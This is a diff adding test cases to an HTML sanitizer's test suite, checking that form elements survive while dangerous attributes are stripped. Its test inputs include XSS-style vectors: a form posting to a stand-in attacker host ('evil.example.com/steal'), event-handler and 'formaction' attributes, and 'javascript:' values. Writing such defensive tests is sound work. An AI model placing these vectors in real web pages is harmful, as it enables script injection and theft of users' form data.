@@ -84,10 +84,62 @@ describe('sanitizeHtml — vectors die', () => {
 	});
 });
 
+describe('sanitizeHtml — forms survive, attack surface stays closed (114 §3.9)', () => {
+	it('keeps the functional form allowlist', () => {
+		const out = sanitizeHtml(
+			'<form class="elementor-form" name="contact">' +
+				'<label for="f-name">Name</label>' +
+				'<input type="text" name="form_fields[name]" id="f-name" placeholder="Jane" required="required" />' +
+				'<textarea name="form_fields[msg]" rows="4" cols="30"></textarea>' +
+				'<select name="form_fields[topic]"><option value="a" selected="selected">Alpha</option><option value="b">Beta</option></select>' +
+				'<button type="submit">Send</button>' +
+				'</form>'
+		);
+		expect(out).toContain('<form');
+		expect(out).toContain('name="form_fields[name]"');
+		expect(out).toContain('required');
+		expect(out).toContain('<textarea');
+		expect(out).toContain('<select');
+		expect(out).toContain('value="a"');
+		expect(out).toContain('<button type="submit">Send</button>');
+	});
+
+	it('strips action, method, onsubmit and formaction from forms', () => {
+		const out = sanitizeHtml(
+			'<form action="https://evil.example.com/steal" method="post" onsubmit="alert(1)">' +
+				'<input type="text" name="a" formaction="javascript:alert(2)" onfocus="alert(3)" />' +
+				'</form>'
+		);
+		expect(out).not.toContain('action');
+		expect(out).not.toContain('method');
+		expect(out).not.toContain('onsubmit');
+		expect(out).not.toContain('formaction');
+		expect(out).not.toContain('onfocus');
+		expect(out).toContain('name="a"');
+	});
+
+	it('drops javascript: values on form controls', () => {
+		const out = sanitizeHtml('<input type="text" name="a" value="javascript:alert(1)" />');
+		expect(out).not.toContain('javascript:');
+		expect(out).not.toContain('value=');
+	});
+
+	it('keeps hidden ID carriers (form_id, JFB id) for the classifier', () => {
+		const out = sanitizeHtml(
+			'<form><input type="hidden" name="form_id" value="abc123" />' +
+				'<input type="hidden" name="_jet_engine_booking_form_id" value="7" /></form>'
+		);
+		expect(out).toContain('name="form_id"');
+		expect(out).toContain('value="abc123"');
+		expect(out).toContain('name="_jet_engine_booking_form_id"');
+	});
+});
+
 describe('sanitize contract', () => {
 	it('exposes a versioned allowlist for stale-copy detection', () => {
-		expect(SANITIZE_VERSION).toBeGreaterThan(0);
+		expect(SANITIZE_VERSION).toBe(2); // The 114 §3.9 form allowlist bump.
 		expect(SANITIZE_OPTIONS.allowedTags).toContain('figure');
+		expect(SANITIZE_OPTIONS.allowedTags).toContain('form');
 		expect(SANITIZE_OPTIONS.allowedTags).not.toContain('script');
 	});
 });
